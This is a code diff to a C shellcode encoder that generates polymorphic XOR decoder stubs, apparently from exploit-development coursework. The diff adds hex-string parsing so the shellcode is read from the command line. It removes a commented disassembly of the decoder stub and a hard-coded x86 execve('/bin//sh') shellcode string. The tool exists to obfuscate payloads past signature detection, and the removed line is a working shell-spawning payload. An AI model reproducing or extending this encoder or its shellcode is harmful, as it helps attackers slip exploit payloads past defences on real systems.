@@ -14,6 +14,33 @@
 
 typedef enum {false, true} bool;
 
+char char2byte(char c) {
+	if( (c >= '0') && (c <= '9') )
+		return (c - '0');
+	if( (c >= 'A') && (c <= 'F') )
+		return (c - 'A' + 0xa);
+	if( (c >= 'a') && (c <= 'f') )
+		return (c - 'a' + 0xa);
+
+	printf("[!] Error: invalid input('%c')!\n", c);
+	return -1;
+}
+
+void hex2bin(const char* src, char* target) {
+	printf("     ");
+	while(src[0]) {
+		// Skip the "\x"
+		src += 1;
+
+		printf("%c%c", src[0], src[1]);
+
+		// Convert hex to bin
+		*(target++) = char2byte(src[0])*0x10 + char2byte(src[1]);
+		src += 2;
+	}
+	printf("\n");
+}
+
 bool containsNulls(char *shellcode, int length) {
 	if ( strlen(shellcode) == length)
 		return false;
@@ -129,27 +156,7 @@ char* polymorphicDecoder(char key, int codeLength) {
 		decoderParts[0][1] -= 1;
 		decoderParts[18][1] += 1;
 	}
-/*
- 8048060:  0      eb 1e           ;!;     Set to correct memory!
- 8048062:  1      90              ;7;     ...
- 8048063:  2      5e
- 8048064:  3      31 c0           ;1;     6a aa
- 8048066:  4      b0 aa           ;1;     58
- 8048068:  5      31 c9           ;2;     6a aa
- 804806a:  6      b1 aa           ;2;     59
- 804806c:  7      8a 1e           ;3;     8a 16
- 804806e:  8      32 06           ;4;     30 06
- 8048070:  9      88 06           ;4;     ...
- 8048072: 10      88 da           ;3;     88 d3
- 8048074: 11      83 c6 01        ;5;     46
- 8048077: 12      8a 1e           ;3;     8a 16
- 8048079: 13      30 16           ;3;     30 1e
- 804807b: 14      49              ;6;     e2 f7
- 804807c: 15      75 f4           ;6;     ...
- 804807e: 16      eb 06           ;8;     eb 05
- 8048080: 17      90              ;8;     ...
- 8048081: 18      e8 dc ff ff ff  ;!;     Set to correct memory!
-*/
+
 	printf("     Forming string..\n");
 
 	static char stub[50];
@@ -201,9 +208,10 @@ int main(int argc, char *argv[]) {
 
 	// Import the shellcode
 	printf("[*] Importing shellcode..\n");
-	//char *shellcode = argv[1];
-	char shellcode[] = \
-	"\x31\xc0\x50\x89\xe2\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";
+	char shellcode[256];
+	const char *shellcode_string = argv[1];
+	printf("     Converting hex-string to byte-array..\n");
+	hex2bin(shellcode_string, shellcode);
 	int length = strlen(shellcode);
 	char *encodedShellcode;
 
